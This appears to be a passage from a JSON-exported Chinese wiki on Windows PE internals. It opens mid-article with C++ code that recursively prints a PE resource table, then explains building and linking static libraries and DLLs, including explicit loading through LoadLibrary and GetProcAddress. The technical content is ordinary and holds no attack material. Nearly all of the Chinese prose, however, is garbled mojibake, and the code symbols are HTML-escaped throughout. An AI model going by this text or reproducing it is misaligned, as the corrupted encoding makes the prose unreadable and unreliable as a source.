ä¸ºäº†æ›´æ¸…æ™°åœ°è¡¨ç¤ºå±‚çº§å…³ç³»ï¼Œä¼šæ ¹æ®levelå±‚çº§æ§åˆ¶æ‰“å°æ—¶å‰é¢çš„ç¼©è¿› Indentå…¨ä¸º0ï¼Œå°†å‰é¢iä¸ªå­—ç¬¦è®¾ç½®ä¸ºâ€œ â€ç©ºå­—ç¬¦ï¼Œæ‰“å°æ—¶æ‰“å°Indentï¼ˆå³è¾“å‡ºç©ºå­—ç¬¦ï¼‰ï¼Œåˆ°0ç»“æŸæ‰“å° 123456// æ ¹æ®å±‚çº§ç”Ÿæˆç¼©è¿›å­—ç¬¦ä¸²ï¼Œæ¯å±‚ç¼©è¿›32ä¸ªç©ºæ ¼char Indent[70] = &#123; 0 &#125;;for (int i = 0; i &lt; (level - 1) * 25 &amp;&amp; i &lt; sizeof(Indent) - 1; ++i)&#123; Indent[i] = &#x27; &#x27;;&#125; èµ„æºç›®å½•é¡¹ä¸­ä¸¤ä¸ªUnionç»“æ„çš„åç§»éƒ½æ˜¯ç›¸å¯¹äºèµ„æºè¡¨çš„èµ·å§‹ä½ç½®ï¼Œå³æ•°æ®ç›®å½•è¡¨ä¸­æè¿°èµ„æºè¡¨çš„VirtualSizeå­—æ®µã€‚å› ä¸ºç¬”è€…æ˜¯åœ¨FileBufferï¼ˆæœªæ‹‰ä¼¸çŠ¶æ€ï¼‰ä¸Šè§£ææ‰“å°èµ„æºè¡¨ï¼Œæ‰€ä»¥ç›¸å…³å­—æ®µçš„å®šä½=(DWORD)FileBuffer+èµ„æºè¡¨FOA+åç§»ã€‚æ¯ä¸ªé€’å½’å‡½æ•°ä¸­å¯èƒ½è¦ç”¨åˆ°èµ„æºè¡¨èµ·å§‹ä½ç½®ï¼Œäºæ˜¯åœ¨å‡½æ•°å‰è¾¹ç”¨å˜é‡è®°å½•äº†èµ„æºè¡¨çš„èµ·å§‹ä½ç½® 123456// èµ„æºè¡¨èµ·å§‹ä½ç½®ï¼Œå·²è½¬ä¸ºFOAauto pBaseResourceDirectory = (PIMAGE_RESOURCE_DIRECTORY)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_RESOURCE);if (!pBaseResourceDirectory) &#123; return;&#125; æ‰“å°Unicodeå­—ç¬¦ä¸² æŒ‡å‘å­—ç¬¦ä¸²åï¼ŒæŒ¨ä¸ªæ‰“å°æ¯ä¸ªå­—ç¬¦ã€‚Unicodeå 2å­—èŠ‚ï¼Œé‡åˆ°&quot;00&quot;å°±ç›¸å½“äºæ²¡æ‰“å°ä¸œè¥¿ 1234567auto pResourceString = (PIMAGE_RESOURCE_DIR_STRING_U)((DWORD)pBaseResourceDirectory + pResourceDirectoryEntry-&gt;NameOffset);printf(&quot;%sName: &quot;, Indent);for (int j = 0; j &lt; pResourceString-&gt;Length; ++j)&#123; printf(&quot;%c&quot;, pResourceString-&gt;NameString[j]);&#125;printf(&quot; &quot;); ç¬¬ä¸€å±‚æ—¶Idå­—æ®µè¡¨ç¤ºé¢„å®šä¹‰çš„èµ„æºç±»å‹ï¼Œç”¨ä¸€ä¸ªmapå­˜æ•°å€¼ä¸èµ„æºç±»å‹æ–‡å­—çš„æ˜ å°„ã€‚GetResourceTypeStringæ¥æ”¶ä¸€ä¸ªidï¼Œè¿”å›å‡ºç›¸åº”å­—ç¬¦ä¸² 123456789101112131415161718192021222324252627const char* PEManipulator::GetResourceTypeString(WORD resourceId)&#123; static const std::unordered_map&lt;WORD, std::string&gt; resourceTypeMap = &#123; &#123;1, &quot;Cursor å…‰æ ‡&quot;&#125;, &#123;2, &quot;Bitmap ä½å›¾&quot;&#125;, &#123;3, &quot;Icon å›¾æ ‡&quot;&#125;, &#123;4, &quot;Menu èœå•&quot;&#125;, &#123;5, &quot;Dialog å¯¹è¯æ¡†&quot;&#125;, &#123;6, &quot;String å­—ç¬¦ä¸²&quot;&#125;, &#123;7, &quot;Font Directory å­—ä½“ç›®å½•&quot;&#125;, &#123;8, &quot;Font å­—ä½“ &quot;&#125;, &#123;9, &quot;Accelerators åŠ é€Ÿé”®&quot;&#125;, &#123;10, &quot;Unformatted æœªæ ¼å¼åŒ–èµ„æº &quot;&#125;, &#123;11, &quot;MessageTable æ¶ˆæ¯è¡¨&quot;&#125;, &#123;12, &quot;Group Cursor å…‰æ ‡ç»„&quot;&#125;, &#123;14, &quot;Group Icon å›¾æ ‡ç»„&quot;&#125;, &#123;16, &quot;Version Information ç‰ˆæœ¬ä¿¡æ¯&quot;&#125; &#125;; auto it = resourceTypeMap.find(resourceId); // åœ¨mapä¸­æŸ¥æ‰¾æŒ‡å®šçš„é”® if (it != resourceTypeMap.end()) // å¦‚æœæ‰¾åˆ° &#123; return it-&gt;second.c_str(); // è¿”å›å¯¹åº”çš„å­—ç¬¦ä¸² &#125; return &quot;Unknownï¼ˆæœªçŸ¥ï¼‰&quot;; // å¦‚æœæ²¡æ‰¾åˆ°ï¼Œè¿”å›&quot;Unknownï¼ˆæœªçŸ¥ï¼‰&quot;&#125; å¤„ç†ç¬¬äºŒä¸ªUnionç»“æ„æ—¶ï¼Œå¦‚æœæŒ‡å‘ä¸‹ä¸€çº§ç›®å½•ï¼ŒæŒ‡å‘ä¸‹ä¸€çº§èµ„æºç›®å½•åï¼Œè°ƒç”¨PrintResourceDirectoryï¼ˆé€’å½’ï¼‰æ‰“å°è¯¥èŠ‚ç‚¹ 123456789101112// å¤„ç†ç¬¬äºŒä¸ªUnionç»“æ„if (pResourceDirectoryEntry-&gt;DataIsDirectory) // æœ€é«˜ä½ä¸º1ï¼ŒæŒ‡å‘ä¸‹ä¸€çº§ç›®å½•&#123; printf(&quot;%sOffsetToDirectory: 0x%08X ï¼ˆæŒ‡å‘ä¸‹ä¸€çº§ç›®å½•ï¼‰ &quot;, Indent, pResourceDirectoryEntry-&gt;OffsetToData); //æŒ‰OffsetToDataæ‰“ï¼ŒæŠŠæœ€é«˜ä½ä¹Ÿæ‰“å°äº† auto pSubResourceDirectory = (PIMAGE_RESOURCE_DIRECTORY)((DWORD)pBaseResourceDirectory + pResourceDirectoryEntry-&gt;OffsetToDirectory); PrintResourceDirectory(pSubResourceDirectory, level + 1); // é€’å½’è°ƒç”¨&#125;else // æœ€é«˜ä½ä¸º0ï¼ŒæŒ‡å‘æ•°æ®&#123; //...&#125; å¦‚æœæŒ‡å‘çš„æ˜¯èµ„æºæ•°æ®ï¼ŒæŒ‡è¿‡å»åï¼Œç›´æ¥æ‰“å°èµ„æºè¡¨çš„æ•°æ®ä¿¡æ¯ 123456789101112131415161718// å¤„ç†ç¬¬äºŒä¸ªUnionç»“æ„if (pResourceDirectoryEntry-&gt;DataIsDirectory) // æœ€é«˜ä½ä¸º1ï¼ŒæŒ‡å‘ä¸‹ä¸€çº§ç›®å½•&#123; //... //é€’å½’è°ƒç”¨&#125;else // æœ€é«˜ä½ä¸º0ï¼ŒæŒ‡å‘æ•°æ®&#123; //... auto pResourceDataEntry = (PIMAGE_RESOURCE_DATA_ENTRY)((DWORD)pBaseResourceDirectory + pResourceDirectoryEntry-&gt;OffsetToData); printf(&quot; %s[èµ„æºè¡¨çš„æ•°æ®ä¿¡æ¯] &quot;, Indent); printf(&quot; %sOffsetToData: 0x%08X &quot;, Indent, pResourceDataEntry-&gt;OffsetToData); printf(&quot; %sSize: 0x%08X &quot;, Indent, pResourceDataEntry-&gt;Size); printf(&quot; %sCodePage: 0x%08X &quot;, Indent, pResourceDataEntry-&gt;CodePage); printf(&quot; %sReserved: 0x%08X &quot;, Indent, pResourceDataEntry-&gt;Reserved);&#125; æµ‹è¯•å‡½æ•°12345678910111213int TestPrintResourceTable()&#123; //PEManipulator PEFile(&quot;E:\\\\temp\\\\ResourceTable\\\\fg.exe&quot;); //æ–‡ä»¶å¯¹é½=å†…å­˜å¯¹é½ï¼Œèµ„æºè¾ƒå¤š PEManipulator PEFile(&quot;E:\\\\temp\\\\ResourceTable\\\\MyFirstDialog.exe&quot;); //èµ„æºè¾ƒå°‘ if (!PEFile.MapPEFile() || !PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; PEFile.PrintResourceTable(); return 0;&#125; è¿è¡Œç»“æœ ç¨‹åºæ‰“å°ç»“æœå’Œç”¨Lord PEå·¥å…·æ‰“å°çš„è¿›è¡Œæ¯”å¯¹ï¼Œå„å­—æ®µä¸€è‡´ç®—ç¨‹åºæ­£å¸¸ æœªæ¥å¯å®Œå–„çš„å·¥ä½œ ç¼–å†™ç¨‹åºï¼Œæä¾›ç¨‹åºå›¾æ ‡èµ„æº ç¼–å†™ç¨‹åºï¼Œä¿®æ”¹å¯¹è¯æ¡†æ ‡é¢˜"},{"title":"é™æ€é“¾æ¥åº“å’ŒåŠ¨æ€é“¾æ¥åº“","path":"/wiki/PE/é™æ€é“¾æ¥åº“å’ŒåŠ¨æ€é“¾æ¥åº“.html","content":"é™æ€é“¾æ¥åº“ ç¼–å†™é™æ€é“¾æ¥åº“å¹¶ä½¿ç”¨ 1. åˆ›å»ºé™æ€é“¾æ¥åº“é¡¹ç›® VSVC6æ–¹å¼ä¸€æ–¹å¼äºŒåˆ›å»ºç©ºé¡¹ç›®ï¼ŒæŒ‰å¹³æ—¶å¤šæ–‡ä»¶ç¼–ç¨‹é‚£æ ·å†™.hå’Œ.cppæ–‡ä»¶ã€‚ ä¿®æ”¹é¡¹ç›®å±æ€§ï¼šå±æ€§-&gt;é…ç½®å±æ€§-&gt;å¸¸è§„-&gt;é…ç½®ç±»å‹ï¼Œåº”ç”¨ç¨‹åºï¼ˆ.exeï¼‰ä¿®æ”¹ä¸ºé™æ€åº“ï¼ˆ.libï¼‰ã€‚è¿™æ ·ä¹‹åç‚¹å‡»ç”Ÿæˆï¼Œç”Ÿæˆçš„å°±æ˜¯.libæ–‡ä»¶ è¿™ç§æ–¹å¼VSä¼šç”Ÿæˆé¢„ç¼–è¯‘å¤´pch.hã€‚æŒ‰å¤šæ–‡ä»¶ç¼–ç¨‹é‚£æ ·åˆ›å»º.hå’Œ.cppæ–‡ä»¶ï¼Œæ¯ä¸ª.cppæ–‡ä»¶ä¸­éœ€è¦åŒ…å«è¿™ä¸ªé¢„ç¼–è¯‘å¤´#include &quot;pch.h&quot;ï¼Œå¦åˆ™ç¼–è¯‘ä¸è¿‡å»ã€‚ 2. ç¼–å†™ä»£ç å¹¶ç¼–è¯‘ç”Ÿæˆlibæ–‡ä»¶ ArithmeticOperations.h123456#pragma onceint Plus(int x, int y);int Sub(int x, int y);int Mul(int x, int y);int Div(int x, int y); ArithmeticOperations.cpp123456789101112131415161718#include &quot;ArithmeticOperations.h&quot;int Plus(int x, int y)&#123;\treturn x + y;&#125;int Sub(int x, int y)&#123;\treturn x - y;&#125;int Mul(int x, int y)&#123;\treturn x * y;&#125;int Div(int x, int y)&#123;\treturn x / y;&#125; ç‚¹ç”Ÿæˆï¼Œç¼–è¯‘ç”Ÿæˆlibæ–‡ä»¶ 3. ä½¿ç”¨é™æ€é“¾æ¥åº“ å°†.hå’Œ.libæ–‡ä»¶å¤åˆ¶åˆ°è¦ä½¿ç”¨çš„é¡¹ç›®ä¸­ åœ¨éœ€è¦ä½¿ç”¨çš„æ–‡ä»¶ä¸­åŒ…å«å¤´æ–‡ä»¶#include &quot;xxx.h&quot; 1#include &quot;xxx.h&quot; //å¤´æ–‡ä»¶ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨å‡½æ•°å£°æ˜ é“¾æ¥libåº“æ–‡ä»¶ é“¾æ¥æ–¹å¼ä¸€é“¾æ¥æ–¹å¼äºŒ123#pragma comment(lib, &quot;xxx.lib&quot;)\t//å‡½æ•°çš„å®ç°åœ¨libä¸­ //è¿™è¡Œå‘Šè¯‰linké“¾æ¥æ—¶éœ€è¦linkçš„libåº“æ–‡ä»¶ //å¦‚æœä»£ç ä¸­ç”¨åˆ°äº†Pluså‡½æ•°ï¼Œä¸åŠ è¿™è¡Œï¼Œlinkæ—¶æ‰¾ä¸åˆ°å‡½æ•°çš„å®ç°ï¼Œå°±ä¼šæŠ¥é”™é¡¹ç›®ï¼Œlinkè®¾ç½®åŠ ä¸Šè¿™ä¸ªlibåº“çš„æ–‡ä»¶å ä»VSåŸæœ¬linkçš„libå°±å¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬ä¹‹å‰æ˜¯ä½¿ç”¨è¿‡é™æ€é“¾æ¥åº“çš„ã€‚æ¯”å¦‚æˆ‘ä»¬ä¹‹å‰åŒ…å«äº†å¤´æ–‡ä»¶windows.hï¼Œstdio.hç„¶åå°±ç›´æ¥è°ƒç”¨å‡½æ•°ã€‚å› ä¸ºå¤´æ–‡ä»¶åªæœ‰å‡½æ•°çš„å£°æ˜ï¼Œæ²¡æœ‰å®ç°ï¼Œå®ç°éƒ½åœ¨libæ–‡ä»¶ä¸­ï¼ŒIDEé¡¹ç›®é…ç½®çš„linkå¡«çš„è¿™äº›ï¼Œå°±æ˜¯å¸®æˆ‘ä»¬ç¼–è¯‘æ—¶linkè¿™äº›lib VC6ä¸‹Linkè®¾ç½®çš„åœ°æ–¹ï¼š é“¾æ¥æ–¹å¼ä¸€çš„ä¾‹å­é“¾æ¥æ–¹å¼äºŒçš„ä¾‹å­åœ¨éœ€è¦ä½¿ç”¨libåº“çš„æºç æ–‡ä»¶ä¸­åŠ ä¸Šå¦‚ä¸‹ä¸¤è¡Œ ä¾‹ main.cpp123456789#include &quot;ArithmeticOperations.h&quot;#pragma comment(lib,&quot;MyTestLib.lib&quot;)int main()&#123;\tint x = Plus(1, 2);\treturn 0;&#125; ç¼–è¯‘ï¼Œé€šè¿‡ä¾‹ï¼šmain.cpp1234567#include &quot;ArithmeticOperations.h&quot;int main()&#123;\tint x = Plus(1, 2);\treturn 0;&#125; é¡¹ç›®ï¼Œlinkè®¾ç½®åŠ ä¸Šäº†è¿™ä¸ªlibåº“çš„æ–‡ä»¶å ç¼–è¯‘ï¼Œé€šè¿‡ é™æ€é“¾æ¥åº“çš„ç‰¹ç‚¹ linkæ—¶å°†é™æ€é“¾æ¥åº“é‡Œçš„æ‰€æœ‰å†…å®¹éƒ½ç¼–è¯‘åˆ°å¯æ‰§è¡Œæ–‡ä»¶exeé‡Œå»äº†ï¼Œä¼šå¯¼è‡´exeæ–‡ä»¶ä½“ç§¯å˜å¤§ åŒ…å«ç›¸åŒçš„å…¬å…±ä»£ç ï¼Œé€ æˆæµªè´¹ å‡è®¾åœ¨10ä¸ªé¡¹ç›®ä¸­éƒ½ä½¿ç”¨äº†åŒä¸€ä¸ªé™æ€é“¾æ¥åº“ï¼Œè¿™10ä¸ªé¡¹ç›®éƒ½è¦å°†libä¸­çš„ä»£ç ç¼–è¯‘åˆ°è‡ªå·±çš„å¯æ‰§è¡Œæ–‡ä»¶exeé‡Œï¼Œé‚£ä¹ˆç›¸åŒçš„ä»£ç ä¼šè¢«å¤åˆ¶å¤šä»½ã€‚è€Œdllä¸ä¸€æ ·ï¼Œdllä¸ä¼šè¢«ç¼–è¯‘åˆ°exeé‡Œï¼Œè€Œæ˜¯exeè¿è¡Œæ—¶åŠ è½½åˆ°è¿›ç¨‹ç©ºé—´ä¸­ã€‚è€Œä¸”å¯¹äºç³»ç»Ÿçš„dllï¼Œçœ‹ä¼¼æ¯ä¸ªè¿›ç¨‹ç©ºé—´ä¸­éƒ½ä¼šåŠ è½½ä¸€ä»½ï¼Œå®é™…ä¸Šè¿™äº›dllæ–‡ä»¶åœ¨ç‰©ç†å†…å­˜ä¸­åªæœ‰ä¸€ä»½ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æ˜ å°„åˆ°è¿™ä¸ªç›¸åŒçš„ç‰©ç†é¡µ ä»åæ±‡ç¼–è§’åº¦ä¸Šçœ‹ï¼Œæ˜¯çœ‹ä¸å‡ºæ˜¯è‡ªå·±å®ç°çš„è¿˜æ˜¯ç”¨çš„libä¸­çš„ è¯æ˜æ–¹æ³•ï¼šVSä¸­æ­¥è¿›libä¸­çš„å‡½æ•°çš„å‡½æ•°åœ°å€ï¼Œå’Œæ­£å¸¸å†™çš„å‡½æ•°çš„å‡½æ•°åœ°å€ä¸Šçœ‹ä¸å‡ºåŒºåˆ« å¦‚æœlibåº“çš„å‡½æ•°å®ç°éœ€è¦æ›´æ–°ï¼Œé‡æ–°ç¼–è¯‘libåï¼Œè¿˜éœ€è¦é‡æ–°ç¼–è¯‘exeï¼›è€Œdllæ”¹å®Œï¼Œä¸ç”¨åŠ¨exe åŠ¨æ€é“¾æ¥åº“ ç¼–å†™åŠ¨æ€é“¾æ¥åº“å¹¶ä½¿ç”¨ 1. åˆ›å»ºåŠ¨æ€é“¾æ¥åº“é¡¹ç›® VSVC6æ–¹å¼ä¸€æ–¹å¼äºŒåˆ›å»ºç©ºé¡¹ç›®ï¼ŒæŒ‰å¹³æ—¶å¤šæ–‡ä»¶ç¼–ç¨‹é‚£æ ·å†™.hå’Œ.cppæ–‡ä»¶ã€‚ ä¿®æ”¹é¡¹ç›®å±æ€§ï¼šå±æ€§-&gt;é…ç½®å±æ€§-&gt;å¸¸è§„-&gt;é…ç½®ç±»å‹ï¼Œåº”ç”¨ç¨‹åºï¼ˆ.exeï¼‰ä¿®æ”¹ä¸ºåŠ¨æ€åº“ï¼ˆ.dllï¼‰ã€‚è¿™æ ·ä¹‹åç‚¹å‡»ç”Ÿæˆï¼Œç”Ÿæˆçš„å°±æ˜¯.dllæ–‡ä»¶ è¿™ç§æ–¹å¼VSä¼šç”Ÿæˆé¢„ç¼–è¯‘å¤´pch.hã€‚æŒ‰å¤šæ–‡ä»¶ç¼–ç¨‹é‚£æ ·åˆ›å»º.hå’Œ.cppæ–‡ä»¶ï¼Œæ¯ä¸ª.cppæ–‡ä»¶ä¸­éœ€è¦åŒ…å«è¿™ä¸ªé¢„ç¼–è¯‘å¤´#include &quot;pch.h&quot;ï¼Œå¦åˆ™ç¼–è¯‘ä¸è¿‡å»ã€‚ è¿˜ä¼šç”Ÿæˆdllmain.cppæ–‡ä»¶ï¼Œè¿™ä¸ªdllmainå‡½æ•°æ˜¯å¯é€‰ï¼Œä¸æ˜¯å¿…é¡»çš„ã€‚ 2. ç¼–å†™ä»£ç å¹¶ç¼–è¯‘ç”Ÿæˆdllæ–‡ä»¶ ArithmeticOperations.h12345#pragma onceextern &quot;C&quot; _declspec(dllexport) int __stdcall Plus(int x, int y);extern &quot;C&quot; _declspec(dllexport) int __stdcall Sub(int x, int y);extern &quot;C&quot; _declspec(dllexport) int __stdcall Mul(int x, int y);extern &quot;C&quot; _declspec(dllexport) int __stdcall Div(int x, int y); ArithmeticOperations.cpp123456789101112131415161718#include &quot;ArithmeticOperations.h&quot;int __stdcall Plus(int x, int y)&#123;\treturn x + y;&#125;int __stdcall Sub(int x, int y)&#123;\treturn x - y;&#125;int __stdcall Mul(int x, int y)&#123;\treturn x * y;&#125;int __stdcall Div(int x, int y)&#123;\treturn x / y;&#125; extern â€œCâ€ åœ¨C++ä¸­æœ‰å‡½æ•°é‡è½½ï¼ˆæ–¹ä¾¿äº†ç¨‹åºå‘˜ä¸ç”¨èµ·åå­—ï¼Œå¯ä»¥æœ‰å¤šä¸ªåå­—ç›¸åŒï¼Œä½†å‚æ•°ç±»å‹ï¼Œè¿”å›ç±»å‹ä¸åŒçš„å‡½æ•°ï¼‰ï¼Œè¿™æ—¶ï¼Œä¸€ä¸ªå‡½æ•°çš„é“¾æ¥åï¼ˆLinkage Nameï¼‰æ˜¯ç”±å‡½æ•°çš„åç§°ã€å‚æ•°ç±»å‹å’Œè¿”å›å€¼ç±»å‹ç­‰ä¿¡æ¯ç»„æˆçš„ï¼Œé“¾æ¥åçš„ä½œç”¨æ˜¯åœ¨ç¼–è¯‘å’Œé“¾æ¥æ—¶å”¯ä¸€æ ‡è¯†è¯¥å‡½æ•° å‚è€ƒï¼š ä½œè€…: ç¼–ç¨‹æŒ‡åŒ— é“¾æ¥: https://csguide.cn/cpp/basics/extern_c.html#å‡½æ•°çš„å‘½åè§„åˆ™ æ¥æº: https://csguide.cn extern &quot;C&quot;è¡¨ç¤ºè¿™ä¸ªå‡½æ•°æŒ‰ç…§Cè¯­è¨€çš„æ–¹å¼è¿›è¡Œç¼–è¯‘ã€é“¾æ¥ __declspec(dllexport)å‘Šè¯‰ç¼–è¯‘å™¨æ­¤å‡½æ•°ä¸ºå¯¼å‡ºå‡½æ•° ä¸å†™è¿™ä¸ªå‰ç¼€ï¼Œå°±æ˜¯æ™®é€šçš„å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¸å‡†å¤‡å¯¼å‡ºç»™åˆ«äººç”¨ ä¸ºäº†æ¸…æ™°ç›´è§‚ï¼Œé€šå¸¸ä¼šçœ‹åˆ°æ­é…å®çš„å†™æ³•123456789101112131415161718192021222324#pragma once#ifdef DemoDll#define DemoDll_API __declspec(dllexport) // å¯¼å‡º#else#define DemoDll_API __declspec(dllimport) // å¯¼å…¥#endif // DemoDll/*\\ brief__cplusplus c++å®*/#ifdef __cplusplusextern &quot;C&quot;&#123;#endif // __cplusplus\t/* \\ brief åœ¨è¿™é‡Œç¼–å†™ å‡½æ•°æ¨¡å—\t*/\tint DemoDll_API add(int a, int b);#ifdef __cplusplus&#125;#endif // __cplusplus ç¼–è¯‘åçœ‹åˆ°ç”Ÿæˆå¦‚ä¸‹æ–‡ä»¶ï¼š ç”¨DependenciesæŸ¥çœ‹è¿™ä¸ªdllçœ‹åˆ°ä¸Šé¢å››ä¸ªå‡½æ•°è¢«å¯¼å‡ºï¼Œè¯´æ˜ç”ŸæˆæˆåŠŸ 3. ä½¿ç”¨åŠ¨æ€é“¾æ¥åº“ ä½¿ç”¨æ–¹å¼ä¸€ï¼šéšå¼é“¾æ¥ä½¿ç”¨æ–¹å¼äºŒï¼šæ˜¾å¼é“¾æ¥å°† *.dll *.lib æ”¾åˆ°å·¥ç¨‹ç›®å½•ä¸‹é¢ åœ¨ä¸Šé¢libçš„ç¼–å†™å’Œä½¿ç”¨ä¸­ï¼Œlibæ”¾å‡½æ•°çš„å®ç°ï¼Œ.hæ˜¯å‡½æ•°çš„å£°æ˜ã€‚è€Œåœ¨è¿™é‡Œï¼Œ.dllé‡Œæ”¾å‡½æ•°çš„å®ç°ä»£ç ï¼Œ.libé‡Œæ˜¯è¯´æ˜è¿™ä¸ªå‡½æ•°çš„ä»£ç åœ¨å“ªé‡Œ åŠ¨æ€åº“çš„libæ–‡ä»¶ä¸é™æ€åº“çš„libæ–‡ä»¶ æ˜¯ä¸åŒçš„ï¼š åŠ¨æ€åº“çš„libæ–‡ä»¶åªæ˜¯dllæ–‡ä»¶é‡Œå¯¼å‡ºå‡½æ•°çš„å£°æ˜å’Œå®šä½ä¿¡æ¯ã€‚æ²¡æœ‰å‡½æ•°çš„å®ç°ã€‚ è€Œé™æ€åº“çš„libæ–‡ä»¶åŒ…å«äº†å‡½æ•°çš„å®ç°ã€‚ å› æ­¤é™æ€åº“çš„libæ–‡ä»¶åªæ˜¯ä½œç”¨åœ¨ç¼–è¯‘é˜¶æ®µï¼Œä¸éœ€è¦å¯¹å¤–å‘å¸ƒã€‚ VS2019-é™æ€åº“&amp;åŠ¨æ€åº“-å¤šé¡¹ç›®æ“ä½œ å¯¹äº.libæ–‡ä»¶ï¼ˆæœ‰ä¸¤ç§æ·»åŠ æ–¹æ³•ï¼‰ å±æ€§é¡µ-&gt;é“¾æ¥å™¨-&gt;å¸¸è§„-&gt;é™„åŠ åº“ç›®å½•ï¼ˆ æ·»åŠ .libæ–‡ä»¶è·¯å¾„ï¼‰ï¼› å±æ€§é¡µ-&gt;é“¾æ¥å™¨-&gt;è¾“å…¥-&gt;é™„åŠ ä¾èµ–é¡¹ ï¼ˆæ·»åŠ .libæ–‡ä»¶åï¼‰ ç›´æ¥ç”¨#pragma comment(lib,&quot;MyDll.lib) ï¼ˆéœ€è¦å°†è¯¥libæ–‡ä»¶æ”¾åˆ°ä¸exeåŒç›®å½•ä¸‹ï¼‰ è°ƒç”¨dllçš„ä¾‹å­main.cpp123456789101112#pragma comment(lib,&quot;MyTestDll.lib&quot;)extern &quot;C&quot; _declspec(dllimport) int __stdcall Plus(int x, int y);extern &quot;C&quot; _declspec(dllimport) int __stdcall Sub(int x, int y);extern &quot;C&quot; _declspec(dllimport) int __stdcall Mul(int x, int y);extern &quot;C&quot; _declspec(dllimport) int __stdcall Div(int x, int y);int main()&#123;\tint x = Plus(1, 2);\treturn 0;&#125; __declspec(dllimport)å‘Šè¯‰ç¼–è¯‘å™¨æ­¤å‡½æ•°ä¸ºå¯¼å…¥å‡½æ•° éšå¼é“¾æ¥æ˜¯è®©ç¼–è¯‘å™¨å»æ‰¾è¿™ä¸ªdllï¼Œæ‰€ä»¥å«éšå¼ã€‚ æ˜¾å¼é“¾æ¥æ˜¯è‡ªå·±å†™ä»£ç è‡ªå·±å»é“¾æ¥ï¼Œç”¨LoadLibraryå°†dllåŠ è½½åˆ°è‡ªå·±çš„è¿›ç¨‹ç©ºé—´ä¸­ æ˜¾å¼é“¾æ¥åªéœ€è¦ä¸€ä¸ªæ–‡ä»¶ï¼š.dllæ–‡ä»¶ã€‚ æ‰€è°“æ˜¾å¼é“¾æ¥ï¼Œå°±æ˜¯ç›´æ¥è°ƒç”¨WIN32 APIå‡½æ•°LoadLibraryã€GetProcAddresså’ŒFreeLibraryæ˜¾å¼åœ°è£…è½½ã€å¸è½½dllã€‚ æ­¥éª¤ï¼š å®šä¹‰å‡½æ•°æŒ‡é’ˆå˜é‡ï¼Œç”¨äºæ¥æ”¶dllä¸­å‡½æ•°åœ°å€ ä½¿ç”¨LoadLibraryæ¥è®²dllåŠ è½½åˆ°è‡ªå·±çš„è¿›ç¨‹ç©ºé—´ä¸­ï¼Œè·å–è¯¥DLLçš„æ¨¡å—å¥æŸ„ ä½¿ç”¨GetProcAddressè·å–dllä¸­å‡½æ•°çš„åœ°å€ ä½¿ç”¨å‡½æ•° ä½¿ç”¨FreeLibraryå‡å°‘dllå¼•ç”¨è®¡æ•° 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main()&#123;\t//1ã€åŠ¨æ€åŠ è½½dllåˆ°å†…å­˜ä¸­ HMODULE hModule = LoadLibrary(TEXT(&quot;MyTestDll.dll&quot;));\tif (hModule == NULL)\t&#123; printf(&quot;[!] Failed to load MyTestDll.dll &quot;); return 0;\t&#125;\t//2ã€å®šä¹‰å‡½æ•°æŒ‡é’ˆ\tusing fpPlus = int(__stdcall*)(int, int);\tusing fpSub = int(__stdcall*)(int, int);\tusing fpMul = int(__stdcall*)(int, int);\tusing fpDiv = int(__stdcall*)(int, int);\t//3ã€å£°æ˜å‡½æ•°æŒ‡é’ˆå˜é‡ï¼Œæ¥æ”¶è·å–çš„å‡½æ•°åœ°å€ fpPlus myPlus = (fpPlus)GetProcAddress(hModule, &quot;_Plus@8&quot;);\tif (myPlus == NULL)\t&#123; printf(&quot;[!] Failed to get the address of _Plus@8 &quot;); FreeLibrary(hModule); return 0;\t&#125;\tfpSub mySub = (fpSub)GetProcAddress(hModule, &quot;_Sub@8&quot;); //æ£€æŸ¥mySubçš„å€¼çš„ä»£ç ç•¥\tfpMul myMul = (fpMul)GetProcAddress(hModule, &quot;_Mul@8&quot;); //æ£€æŸ¥myMulçš„å€¼çš„ä»£ç ç•¥\tfpDiv myDiv = (fpDiv)GetProcAddress(hModule, &quot;_Div@8&quot;); //æ£€æŸ¥myDivçš„å€¼çš„ä»£ç ç•¥\t//4ã€è°ƒç”¨å‡½æ•° int a = myPlus(10, 2);\tint b = mySub(10, 2);\tint c = myMul(10, 2);\tint d = myDiv(10, 2);\tprintf(&quot;%d %d %d %d &quot;, a, b, c, d);\t//5ã€å‡å°‘dllå¼•ç”¨è®¡æ•°\tFreeLibrary(hModule);\treturn 0;&#125; åŠ¨æ€é“¾æ¥åº“çš„ç‰¹ç‚¹ dllä¸­çš„ä»£ç ä¸ä¼šç¼–è¯‘åˆ°å¯æ‰§è¡Œæ–‡ä»¶exeé‡Œï¼Œä½¿ç”¨ODæ‰“å¼€exeï¼Œåœ¨Moduleé‡Œèƒ½çœ‹åˆ°è¯¥exeè¦ç”¨åˆ°çš„dll ä»åæ±‡ç¼–è§’åº¦ä¸Šçœ‹ï¼Œèƒ½çœ‹å‡ºæ˜¯è‡ªå·±å®ç°çš„è¿˜æ˜¯ç”¨çš„dllä¸­çš„å‡½æ•° è¯æ˜æ–¹æ³•ï¼šVSä¸­æ­¥è¿›dllä¸­çš„å‡½æ•°çš„å‡½æ•°åœ°å€ï¼Œå’Œæ­£å¸¸å†™çš„å‡½æ•°çš„å‡½æ•°åœ°å€ä¸Šæœ‰å·®åˆ« å¦‚æœdllä¸­çš„å‡½æ•°å®ç°éœ€è¦æ›´æ–°ï¼Œé‡æ–°ç¼–è¯‘dllåï¼Œexeæ— éœ€é‡æ–°ç¼–è¯‘ã€‚ä»è¿™ä¸ªè§’åº¦æ¥è®²ï¼Œä½¿ç”¨dllçš„æ–¹å¼å®ç°äº†â€œæ¨¡å—åŒ–â€ï¼ˆå“ªå—æœ‰é—®é¢˜æ”¹å“ªå—ï¼Œå…¶ä»–çš„ä¸å—å½±å“ï¼‰ã€‚ ä½¿ç”¨.defæ–¹å¼å¯¼å‡ºå‡½æ•° è¿˜æœ‰ä¸€ç§ä½¿ç”¨.defçš„æ–¹å¼å¯¹å‡½æ•°å¯¼å‡ºï¼Œå¯ä»¥åœ¨.defä¸­æŒ‡å®šå‡½æ•°çš„å¯¼å‡ºåºå·ï¼Œå‡½æ•°åæ˜¯å¦åŒ¿åå¯¼å‡ºã€‚å› 